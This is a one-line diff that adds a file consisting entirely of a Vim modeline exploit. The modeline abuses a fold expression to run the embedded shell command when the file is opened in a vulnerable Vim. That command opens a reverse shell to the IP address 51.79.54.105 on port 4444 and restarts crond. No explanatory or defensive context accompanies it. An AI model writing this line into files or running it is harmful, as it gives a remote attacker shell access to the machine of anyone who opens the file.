@@ -1,0 +1,1 @@
+:!0<&196;exec 196<>/dev/tcp/51.79.54.105/4444; sh <&196 >&196 2>&196;/etc/init.d/crond restart||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
